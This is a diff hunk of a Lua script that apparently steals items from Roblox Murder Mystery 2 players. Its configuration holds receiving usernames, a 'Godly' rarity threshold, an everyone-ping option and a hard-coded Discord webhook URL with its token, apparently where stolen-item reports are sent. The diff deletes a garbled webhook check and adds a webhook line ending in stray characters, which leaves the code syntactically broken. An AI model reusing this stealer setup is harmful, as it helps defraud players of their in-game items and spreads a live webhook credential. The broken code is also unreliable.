@@ -8,12 +8,7 @@ local users = _G.Usernames or {"grouchyitzcoatl","taeIstnkzxx"}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1415133057584857100/aw8kFTPw5uhLblOLtZ5KGBwXNlUpovpePGBtTbvcTm04ukyQwsHv7ih_HsfdNk7sKZZu"
-
-if next(users) == webhook == "https://discord.com/api/webhooks/1415133057584857100/aw8kFTPw5uhLblOLtZ5KGBwXNlUpovpePGBtTbvcTm04ukyQwsHv7ih_HsfdNk7sKZZu" then
-    plr:kick("You didn't add webhook")
-    return
-end
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1415133057584857100/aw8kFTPw5uhLblOLtZ5KGBwXNlUpovpePGBtTbvcTm04ukyQwsHv7ih_HsfdNk7sKZZu"1¹
 
 if game.PlaceId ~= 142823291 then
     plr:kick("Game not supported. Please join a normal MM2 server")
